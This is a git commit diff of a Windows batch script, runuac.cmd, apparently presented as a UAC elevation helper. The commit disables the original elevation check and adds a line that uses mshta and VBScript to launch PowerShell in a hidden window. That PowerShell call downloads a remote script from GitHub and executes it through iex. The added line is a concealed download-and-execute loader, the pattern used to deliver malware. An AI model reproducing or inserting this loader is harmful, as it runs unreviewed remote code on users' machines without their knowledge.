f9462a738858b6312ffa872ba0cb57b03be47581
43a1723 <hai1723notgay@gmail.com>
2024-08-08 20:03:38 +0700

    Update runuac.cmd

--- runuac.cmd
+++ runuac.cmd
@@ -1,2 +1,3 @@
-net session >nul 2>&1
-if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
+REM net session >nul 2>&1
+REM if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
+mshta.exe vbscript:CreateObject("WScript.Shell").Run("powershell -command ""iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1') | iex""",0)(window.close)
